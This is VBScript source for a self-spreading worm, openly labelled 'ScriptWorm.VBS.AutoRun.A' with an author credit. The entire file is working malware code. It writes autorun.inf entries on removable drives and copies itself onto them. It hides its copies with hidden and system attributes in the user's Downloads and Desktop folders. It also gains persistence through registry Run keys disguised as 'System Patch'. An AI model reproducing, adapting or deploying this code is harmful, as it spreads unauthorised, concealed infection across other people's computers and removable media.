'ScriptWorm.VBS.AutoRun.A
'By tsukisuperior
'This worm spreads itself through usb drives using the autorun feature

On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set colDrives = FSO.Drives
Dim fileName
Const ForReading = 1, ForWriting = 2, ForAppending = 8, properties = 7
For Each drive in colDrives
	
	'Check if drives are removeable
	If drive.DriveType = 1 Then
		fileName = (drive.DriveLetter & ":\autorun.inf")
		
		'Check if a autorun.inf already exists, and if not, make one
		If FSO.FileExists(fileName) = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.Close
		End If
		
		'Check if file is empty, before a readall happens, because vbs cannot handle a empty file in readall 
		If FSO.GetFile(fileName).Size = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.WriteLine("[AutoRun]")
			targetFile.Close
		End If
		
		'Find the autorun entry in file
		Set targetFile = FSO.OpenTextFile(fileName, ForAppending)
		Set pattern = New RegExp
		pattern.IgnoreCase = True
		pattern.Global = True
		pattern.Pattern = "\[AutoRun\]"
		
		'If not found, make that tag
		If pattern.Test(FSO.OpenTextFile(fileName).ReadAll) = False Then
			targetFile.WriteLine("[AutoRun]")
		End If
		
		'Add entry to autorun for the worm
		targetFile.WriteLine("shellexecute=" & chr(34) & Wscript.ScriptName & chr(34))
		targetFile.Close
		
		'Hide the worm and mark it system
		If FSO.FileExists(drive.DriveLetter & ":\" & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, drive.DriveLetter & ":\"
			Set mapFile = FSO.GetFile(drive.DriveLetter & ":\" & Wscript.ScriptName)
			mapFile.Attributes = properties
		End If
		
		'Set the autorun.inf file as hidden and system 
		Set mapFile = FSO.GetFile(drive.DriveLetter & ":\autorun.inf")
		mapFile.Attributes = properties
		
	End If
Next

'copy to downloads and hide it
Set WshShell = CreateObject("WScript.Shell")
targetfolder = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads\")
FSO.CopyFile Wscript.ScriptFullName, targetfolder
Set mapFile = FSO.GetFile(targetfolder & "\" & Wscript.ScriptName)
mapFile.Attributes = properties

'add to startup
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & "System Patch " & CStr(Int(Rnd()*1000000)), WshShell.ExpandEnvironmentStrings("%windir%") & "\System32\WScript.exe " & targetfolder & WScript.ScriptName

'copy to desktop and hide it
targetfolder = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Desktop\")
FSO.CopyFile Wscript.ScriptFullName, targetfolder
Set mapFile = FSO.GetFile(targetfolder & "\" & Wscript.ScriptName)
mapFile.Attributes = properties

'add to startup
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & "System Patch " & CStr(Int(Rnd()*1000000)), WshShell.ExpandEnvironmentStrings("%windir%") & "\System32\WScript.exe " & targetfolder & WScript.ScriptName

